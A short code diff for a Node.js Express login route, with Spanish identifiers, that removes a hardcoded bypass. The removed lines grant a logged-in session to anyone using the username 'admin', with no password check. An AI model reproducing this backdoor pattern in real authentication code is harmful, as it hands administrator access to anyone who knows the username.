@@ -744,11 +744,6 @@ app.post('/login', function(req,res){
 						return {"user": x, "passwd": data[i].password, "valido": data[i].valido };
 					}.bind(this));
 					map.forEach(function(element) {
-						if(element.user == "admin" || user == "admin") {
-							req.session.logged = true;
-							req.session.user = element;
-							resolve(respuesta = "response ok");
-						}
 						if(element.user == user && element.valido == '0'){
 							exist = true;
 							reject(respuesta = false);
